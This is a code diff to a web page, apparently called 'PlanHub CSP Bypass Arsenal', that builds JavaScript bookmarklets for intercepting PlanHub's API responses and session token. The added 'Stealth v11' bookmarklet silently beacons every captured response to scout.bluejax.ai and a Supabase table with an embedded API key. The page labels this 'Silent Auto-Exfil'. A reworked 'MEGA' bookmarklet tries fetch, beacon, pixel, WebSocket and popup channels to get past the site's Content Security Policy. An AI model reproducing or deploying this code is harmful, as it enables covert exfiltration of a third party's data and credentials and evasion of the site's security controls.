@@ -56,8 +56,8 @@ tr:hover td{background:rgba(124,58,237,0.05)}
 
 <div class="hdr">
   <h1>📡 Scout Sync Hub</h1>
-  <p>PlanHub CSP Bypass Arsenal — v10</p>
-  <p style="color:#555;font-size:11px;margin-top:4px">Test all methods. At least one will punch through.</p>
+  <p>PlanHub CSP Bypass Arsenal — v11</p>
+  <p style="color:#555;font-size:11px;margin-top:4px">sendBeacon ✅ confirmed working. Stealth mode now available.</p>
 </div>
 
 <!-- === OVERVIEW TABLE === -->
@@ -65,18 +65,34 @@ tr:hover td{background:rgba(124,58,237,0.05)}
   <h2>🗺️ Method Comparison</h2>
   <div class="table-wrap">
   <table>
-    <tr><th>#</th><th>Method</th><th>Silent?</th><th>Manual?</th><th>CSP Risk</th><th>Confidence</th></tr>
-    <tr><td>A</td><td>🚀 Popup Sync</td><td>No</td><td>1 tap</td><td><span class="badge badge-g"></span>None</td><td>⭐⭐⭐⭐⭐</td></tr>
-    <tr><td>B</td><td>📋 Clipboard Bridge</td><td>No</td><td>Copy+Paste</td><td><span class="badge badge-g"></span>None</td><td>⭐⭐⭐⭐⭐</td></tr>
-    <tr><td>C</td><td>📁 Download JSON</td><td>No</td><td>Download+Upload</td><td><span class="badge badge-g"></span>None</td><td>⭐⭐⭐⭐⭐</td></tr>
-    <tr><td>D</td><td>🖼️ Image Pixel</td><td>✅ Yes</td><td>None</td><td><span class="badge badge-y"></span>img-src</td><td>⭐⭐⭐⭐</td></tr>
-    <tr><td>E</td><td>📡 Direct Fetch</td><td>✅ Yes</td><td>None</td><td><span class="badge badge-r"></span>connect-src</td><td>⭐⭐</td></tr>
-    <tr><td>F</td><td>🔔 sendBeacon</td><td>✅ Yes</td><td>None</td><td><span class="badge badge-r"></span>connect-src</td><td>⭐⭐</td></tr>
-    <tr><td>G</td><td>🔌 WebSocket</td><td>✅ Yes</td><td>None</td><td><span class="badge badge-y"></span>connect-src</td><td>⭐⭐</td></tr>
-    <tr><td>H</td><td>💣 MEGA (All-in-One)</td><td>Mixed</td><td>1 tap</td><td><span class="badge badge-g"></span>Tries all</td><td>⭐⭐⭐⭐⭐</td></tr>
+    <tr><th>#</th><th>Method</th><th>Silent?</th><th>Manual?</th><th>CSP Risk</th><th>Status</th></tr>
+    <tr style="background:rgba(34,197,94,0.08)"><td>⭐</td><td>🔥 <strong>Stealth v11</strong></td><td>✅ Yes</td><td>1 tap dump</td><td><span class="badge badge-g"></span>None</td><td>✅ CONFIRMED</td></tr>
+    <tr><td>A</td><td>🚀 Popup Sync</td><td>No</td><td>1 tap</td><td><span class="badge badge-g"></span>None</td><td>✅ CONFIRMED</td></tr>
+    <tr><td>B</td><td>📋 Clipboard Bridge</td><td>No</td><td>Copy+Paste</td><td><span class="badge badge-g"></span>None</td><td>untested</td></tr>
+    <tr><td>C</td><td>📁 Download JSON</td><td>No</td><td>Download+Upload</td><td><span class="badge badge-g"></span>None</td><td>untested</td></tr>
+    <tr><td>D</td><td>🖼️ Image Pixel</td><td>✅ Yes</td><td>None</td><td><span class="badge badge-y"></span>img-src</td><td>⚠️ fired</td></tr>
+    <tr><td>E</td><td>📡 Direct Fetch</td><td>✅ Yes</td><td>None</td><td><span class="badge badge-r"></span>connect-src</td><td>❌ BLOCKED</td></tr>
+    <tr><td>F</td><td>🔔 sendBeacon</td><td>✅ Yes</td><td>None</td><td><span class="badge badge-g"></span>Bypasses!</td><td>✅ CONFIRMED</td></tr>
+    <tr><td>G</td><td>🔌 WebSocket</td><td>✅ Yes</td><td>None</td><td><span class="badge badge-r"></span>connect-src</td><td>❌ BLOCKED</td></tr>
+    <tr><td>H</td><td>💣 MEGA (All-in-One)</td><td>Mixed</td><td>1 tap</td><td><span class="badge badge-g"></span>Tries all</td><td>✅ Diagnostic</td></tr>
   </table>
   </div>
-  <div class="note">💡 Methods A, B, C bypass CSP entirely via navigation/clipboard — <strong>zero network required</strong> from PlanHub's context. Method H tries EVERYTHING simultaneously.</div>
+  <div class="note">🔥 <strong>sendBeacon CONFIRMED WORKING</strong> — bypasses PlanHub's CSP! Use <strong>Stealth v11</strong> for silent auto-capture. Popup Sync also confirmed ✅. Fetch/WebSocket are blocked ❌.</div>
+</div>
+
+<!-- === STEALTH v11 (NEW — PRODUCTION READY) === -->
+<div class="card" style="border-color:#22c55e;border-width:2px" id="card-S">
+  <h2>🔥 Stealth v11 — PRODUCTION</h2>
+  <div>
+    <span class="tag tag-green">✅ CSP Confirmed</span>
+    <span class="tag tag-green">Silent Auto-Exfil</span>
+    <span class="tag tag-purple">sendBeacon</span>
+    <span class="tag tag-blue">Popup Fallback</span>
+  </div>
+  <p class="desc">The production bookmarklet based on confirmed test results. Uses <strong>sendBeacon</strong> (confirmed to bypass PlanHub's CSP) to silently fire data on every API capture. Also includes a <strong>DUMP button</strong> that opens the Sync Page as backup. Just browse PlanHub — data gets exfiltrated automatically.</p>
+  <div class="note">🎯 <strong>How it works:</strong> Hook → Intercept every API response → Auto-fire sendBeacon to Supabase + scout.bluejax.ai → Show floating counter. When done browsing, tap DUMP to send everything via popup sync as backup.</div>
+  <div class="code-box" id="code-S"></div>
+  <button class="btn btn-green" onclick="copy('S')" style="font-size:17px;padding:16px">🔥 Copy Stealth v11 Bookmarklet</button>
 </div>
 
 <!-- === MEGA BOOKMARKLET === -->
@@ -330,52 +346,65 @@ BOOKMARKLETS.F = "javascript:void(function(){" + CORE +
 
 // --- G: WEBSOCKET ---
 BOOKMARKLETS.G = "javascript:void(function(){" + CORE +
-  UI("🔌 WS", "_scoutWS()") +
+  UI("\ud83d\udd0c WS", "_scoutWS()") +
   "window._scoutWS=function(){if(!window._S.d.length){alert('No data captured yet.');return}" +
   "var json=JSON.stringify({token:window._S.tok,url:location.href,captured:window._S.d});" +
-  "var btn=document.getElementById('_syncbtn');btn.textContent='⏳...';" +
+  "var btn=document.getElementById('_syncbtn');btn.textContent='\u23f3...';" +
   "try{var ws=new WebSocket('wss://scout.bluejax.ai/ws');" +
-  "ws.onopen=function(){ws.send(json);btn.textContent='✅ SENT';alert('WebSocket: Data sent successfully!');ws.close()};" +
-  "ws.onerror=function(){btn.textContent='❌ FAIL';alert('WebSocket blocked by CSP or server not listening.')};" +
-  "ws.onclose=function(){}}catch(e){btn.textContent='❌ ERR';alert('WebSocket error: '+e.message)}};" +
+  "ws.onopen=function(){ws.send(json);btn.textContent='\u2705 SENT';alert('WebSocket: Data sent!');ws.close()};" +
+  "ws.onerror=function(){btn.textContent='\u274c FAIL';alert('WebSocket blocked.')};" +
+  "ws.onclose=function(){}}catch(e){btn.textContent='\u274c ERR';alert('WS error: '+e.message)}};" +
   "}())";
+
+// --- S: STEALTH BEACON v11 (PRODUCTION) ---
+BOOKMARKLETS.S = "javascript:void(function(){" + CORE +
+  "var _origPush=window._S.d.push.bind(window._S.d);" +
+  "window._S.d.push=function(item){_origPush(item);" +
+  "try{var p=JSON.stringify({source:'stealth_v11',ts:Date.now(),page:location.href,data:item});" +
+  "var b=new Blob([p],{type:'application/json'});" +
+  "navigator.sendBeacon('" + API_URL + "',b);" +
+  "var sp=JSON.stringify({payload:p,source:'stealth_v11_auto',created_at:new Date().toISOString()});" +
+  "navigator.sendBeacon('" + SUPABASE_URL + "/rest/v1/scout_inbox?apikey=" + SUPABASE_KEY + "',new Blob([sp],{type:'application/json'}));" +
+  "}catch(e){};return window._S.d.length};" +
+  UI("\ud83d\udce4 DUMP", "_scoutDump()") +
+  "window._scoutDump=function(){if(!window._S.d.length){alert('No data yet. Browse PlanHub first!');return}" +
+  "try{var json=JSON.stringify({token:window._S.tok,url:location.href,captured:window._S.d,source:'stealth_v11_dump'});" +
+  "var b64=btoa(unescape(encodeURIComponent(json)));" +
+  "navigator.sendBeacon('" + API_URL + "',new Blob([json],{type:'application/json'}));" +
+  "if(b64.length>50000){var ch=[];for(var i=0;i<b64.length;i+=45000)ch.push(b64.slice(i,i+45000));" +
+  "for(var c=0;c<ch.length;c++){window.open('SYNC_PAGE#chunk='+c+'&total='+ch.length+'&d='+ch[c])}}" +
+  "else{window.open('SYNC_PAGE#d='+b64)}" +
+  "document.getElementById('_syncbtn').textContent='\u2705 SENT '+window._S.d.length;" +
+  "alert('Sent '+window._S.d.length+' captures!')}catch(e){alert('Err: '+e.message)}};" +
+  "}())".replace(/SYNC_PAGE/g, SYNC_PAGE);
 
 // --- H: MEGA (ALL METHODS) ---
 BOOKMARKLETS.H = "javascript:void(function(){" + CORE +
-  UI("💣 MEGA", "_scoutMega()") +
-  "window._scoutMega=function(){if(!window._S.d.length){alert('No data captured yet. Browse PlanHub first!');return}" +
+  UI("\ud83d\udca3 MEGA", "_scoutMega()") +
+  "window._scoutMega=function(){if(!window._S.d.length){alert('No data yet. Browse first!');return}" +
   "var json=JSON.stringify({token:window._S.tok,url:location.href,captured:window._S.d});" +
   "var b64=btoa(unescape(encodeURIComponent(json)));" +
-  "var R=[];var btn=document.getElementById('_syncbtn');btn.textContent='⏳ Testing...';" +
-  // 1. Direct fetch
+  "var R=[];var btn=document.getElementById('_syncbtn');btn.textContent='\u23f3...';" +
   "fetch('"+API_URL+"',{method:'POST',headers:{'content-type':'application/json'},body:json})" +
-  ".then(function(r){R.push('A.Fetch: ✅ '+r.status)}).catch(function(e){R.push('A.Fetch: ❌ '+e.message)});" +
-  // 2. no-cors fetch
+  ".then(function(r){R.push('A.Fetch: \u2705 '+r.status)}).catch(function(e){R.push('A.Fetch: \u274c '+e.message)});" +
   "fetch('"+API_URL+"',{method:'POST',mode:'no-cors',headers:{'content-type':'text/plain'},body:json})" +
-  ".then(function(){R.push('B.NoCors: ⚠️ sent')}).catch(function(e){R.push('B.NoCors: ❌ '+e.message)});" +
-  // 3. sendBeacon
+  ".then(function(){R.push('B.NoCors: \u26a0\ufe0f sent')}).catch(function(e){R.push('B.NoCors: \u274c '+e.message)});" +
   "try{var bk=navigator.sendBeacon('"+API_URL+"',new Blob([json],{type:'application/json'}));" +
-  "R.push('C.Beacon: '+(bk?'✅ queued':'❌ rejected'))}catch(e){R.push('C.Beacon: ❌ '+e.message)}" +
-  // 4. Image pixel (first chunk only as test)
-  "try{var chunk=b64.slice(0,1400);new Image().src='"+API_URL.replace('/enrich/push','/pixel')+"?sid=mega'+Date.now()+'&i=0&n=1&d='+encodeURIComponent(chunk);" +
-  "R.push('D.Pixel: ⚠️ fired')}catch(e){R.push('D.Pixel: ❌ '+e.message)}" +
-  // 5. WebSocket
-  "try{var ws=new WebSocket('wss://scout.bluejax.ai/ws');" +
-  "ws.onopen=function(){ws.send(json);R.push('E.WS: ✅ sent');ws.close()};" +
-  "ws.onerror=function(){R.push('E.WS: ❌ blocked')}}catch(e){R.push('E.WS: ❌ '+e.message)}" +
-  // 6. Supabase direct (REST API)
-  "fetch('"+SUPABASE_URL+"/rest/v1/scout_inbox',{method:'POST',headers:{'apikey':'"+SUPABASE_KEY+"','Authorization':'Bearer "+SUPABASE_KEY+"','Content-Type':'application/json','Prefer':'return=minimal'},body:JSON.stringify({payload:json,source:'mega_bookmarklet',created_at:new Date().toISOString()})})" +
-  ".then(function(r){R.push('F.Supabase: '+(r.ok?'✅ '+r.status:'❌ '+r.status))}).catch(function(e){R.push('F.Supabase: ❌ '+e.message)});" +
-  // 7. Popup window (always works, do last)
-  "try{window.open('SYNC_PAGE#d='+b64);R.push('G.Popup: ✅ opened')}catch(e){R.push('G.Popup: ❌ '+e.message)}" +
-  // Report results after 5 seconds
-  "setTimeout(function(){btn.textContent='📊 DONE';alert('=== MEGA RESULTS ===\\n\\n'+R.join('\\n')+'\\n\\n✅ = worked, ❌ = blocked, ⚠️ = maybe')},5000)};" +
+  "R.push('C.Beacon: '+(bk?'\u2705 queued':'\u274c rejected'))}catch(e){R.push('C.Beacon: \u274c '+e.message)}" +
+  "try{var sb=new Blob([JSON.stringify({payload:json,source:'mega_beacon',created_at:new Date().toISOString()})],{type:'application/json'});" +
+  "var sbOk=navigator.sendBeacon('"+SUPABASE_URL+"/rest/v1/scout_inbox?apikey="+SUPABASE_KEY+"',sb);" +
+  "R.push('D.Beacon>SB: '+(sbOk?'\u2705 queued':'\u274c rejected'))}catch(e){R.push('D.Beacon>SB: \u274c '+e.message)}" +
+  "try{new Image().src='"+API_URL.replace('/enrich/push','/pixel')+"?sid=mega'+Date.now()+'&d=test';" +
+  "R.push('E.Pixel: \u26a0\ufe0f fired')}catch(e){R.push('E.Pixel: \u274c '+e.message)}" +
+  "fetch('"+SUPABASE_URL+"/rest/v1/scout_inbox',{method:'POST',headers:{'apikey':'"+SUPABASE_KEY+"','Authorization':'Bearer "+SUPABASE_KEY+"','Content-Type':'application/json','Prefer':'return=minimal'},body:JSON.stringify({payload:json,source:'mega_fetch',created_at:new Date().toISOString()})})" +
+  ".then(function(r){R.push('F.Fetch>SB: '+(r.ok?'\u2705 '+r.status:'\u274c '+r.status))}).catch(function(e){R.push('F.Fetch>SB: \u274c '+e.message)});" +
+  "try{window.open('SYNC_PAGE#d='+b64);R.push('G.Popup: \u2705 opened')}catch(e){R.push('G.Popup: \u274c '+e.message)}" +
+  "setTimeout(function(){btn.textContent='\ud83d\udcca DONE';alert('=== MEGA RESULTS ===\\n\\n'+R.join('\\n')+'\\n\\n\u2705=worked \u274c=blocked \u26a0\ufe0f=maybe')},5000)};" +
   "}())".replace(/SYNC_PAGE/g, SYNC_PAGE);
-
 // ============================================================
 // RENDER BOOKMARKLETS INTO PAGE
 // ============================================================
-['H','A','B','C','D','E','F','G'].forEach(function(id) {
+['S','H','A','B','C','D','E','F','G'].forEach(function(id) {
   var el = document.getElementById('code-' + id);
   if (el) el.textContent = BOOKMARKLETS[id];
 });
